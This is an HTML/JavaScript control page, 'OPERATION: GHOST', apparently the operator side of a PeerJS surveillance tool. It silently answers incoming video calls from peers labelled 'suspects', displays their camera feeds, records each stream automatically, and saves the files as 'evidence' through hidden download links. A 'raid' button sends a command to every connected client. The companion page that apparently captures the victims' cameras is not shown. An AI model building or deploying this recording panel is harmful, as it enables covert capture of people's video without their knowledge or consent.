<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GHOST_DASHBOARD</title>
    <link rel="stylesheet" href="/main.css">
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body { background: #111; color: white; font-family: Arial; overflow: auto; }
        .surveillance-feed {
            border: 2px solid red;
            background: #000;
            position: relative;
            margin-bottom: 20px;
        }
        .feed-label {
            position: absolute;
            top: 5px;
            left: 5px;
            background: red;
            color: white;
            padding: 2px 5px;
            font-size: 12px;
            font-weight: bold;
            z-index: 10;
        }
        .rec-indicator {
            position: absolute;
            top: 5px;
            right: 5px;
            color: red;
            font-weight: bold;
            animation: blink 1s infinite;
            background: rgba(0,0,0,0.7);
            padding: 2px 5px;
            z-index: 10;
        }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <h1 style="text-align:center; color:red; border-bottom:1px solid red;">OPERATION: GHOST - RECORDING ACTIVE</h1>

    <div class="admin-dashboard" id="suspect-grid">
        </div>

    <div class="control-panel">
        <div style="color:red; font-weight:bold; padding-top:10px;">COMMANDS:</div>
        <button class="btn-bust" onclick="executeRaid()">ðŸš¨ EXECUTE RAID ðŸš¨</button>
        <button class="btn-bust" style="background:blue;" onclick="forceSaveAll()">ðŸ’¾ FORCE SAVE ALL</button>
    </div>

    <script>
        // MUST MATCH index.html
        const MY_ADMIN_ID = "admin-node-001";
        
        const adminPeer = new Peer(MY_ADMIN_ID);
        let suspectConnections = []; 
        let activeRecorders = {}; // Store recorder instances to stop them manually

        adminPeer.on('open', id => {
            console.log("SYSTEM ONLINE. ID: " + id);
            alert("DASHBOARD ONLINE. AUTO-RECORDING ENABLED.");
        });

        // 1. RECEIVE CALLS & START RECORDING
        adminPeer.on('call', call => {
            console.log("Suspect Connected!");
            call.answer(); // Answer passively
            
            call.on('stream', suspectStream => {
                const suspectId = call.peer;
                
                // Add to Grid
                addSuspectToGrid(suspectStream, suspectId);
                
                // START RECORDING IMMEDIATELY
                startRecording(suspectStream, suspectId);
            });

            // If suspect disconnects, the recording stops automatically
            call.on('close', () => {
                console.log("Suspect Disconnected. Saving Video...");
                if(activeRecorders[call.peer]) {
                    activeRecorders[call.peer].stop(); // This triggers the save
                }
            });
        });

        // 2. DATA CONNECTIONS (For Raid Button)
        adminPeer.on('connection', conn => {
            conn.on('open', () => {
                suspectConnections.push(conn);
            });
        });

        // --- RECORDING LOGIC ---
        function startRecording(stream, id) {
            // Check if browser supports recording
            if (!MediaRecorder.isTypeSupported('video/webm')) {
                console.error("MediaRecorder not supported");
                return;
            }

            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            let chunks = [];

            // Collect data
            recorder.ondataavailable = e => {
                if (e.data.size > 0) chunks.push(e.data);
            };

            // When recording stops (either manual or disconnect), download file
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const url = URL.createObjectURL(blob);
                
                // Create invisible download link and click it
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = url;
                const timestamp = new Date().toISOString().replace(/:/g, "-");
                a.download = `GHOST_${id}_${timestamp}.webm`;
                document.body.appendChild(a);
                a.click();
                
                // Cleanup
                setTimeout(() => {
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                }, 100);
                
                alert(`EVIDENCE SAVED FOR SUSPECT: ${id}`);
            };

            // Start recording
            recorder.start();
            activeRecorders[id] = recorder; // Save reference
            console.log(`Recording started for ${id}`);
        }

        // --- UI LOGIC ---
        function addSuspectToGrid(stream, id) {
            if(document.getElementById("vid-"+id)) return;

            const wrap = document.createElement('div');
            wrap.className = 'surveillance-feed';
            
            const vid = document.createElement('video');
            vid.srcObject = stream;
            vid.autoplay = true;
            vid.controls = true; 
            vid.muted = true; // Mute locally so you don't get feedback, unmute to listen
            vid.style.width = "100%";
            vid.id = "vid-"+id;

            const label = document.createElement('div');
            label.className = 'feed-label';
            label.innerText = "SUSPECT ID: " + id;

            const recBadge = document.createElement('div');
            recBadge.className = 'rec-indicator';
            recBadge.innerText = "â— REC";

            wrap.appendChild(label);
            wrap.appendChild(recBadge);
            wrap.appendChild(vid);
            document.getElementById('suspect-grid').appendChild(wrap);
        }

        function executeRaid() {
            if(confirm("TRIGGER RAID AND STOP RECORDING?")) {
                suspectConnections.forEach(conn => {
                    conn.send("BUST_CMD");
                });
                forceSaveAll(); // Save all videos when you raid them
            }
        }

        function forceSaveAll() {
            // Manually stop all recorders to trigger downloads
            Object.values(activeRecorders).forEach(recorder => {
                if(recorder.state !== 'inactive') {
                    recorder.stop();
                }
            });
        }

    </script>
</body>
</html>
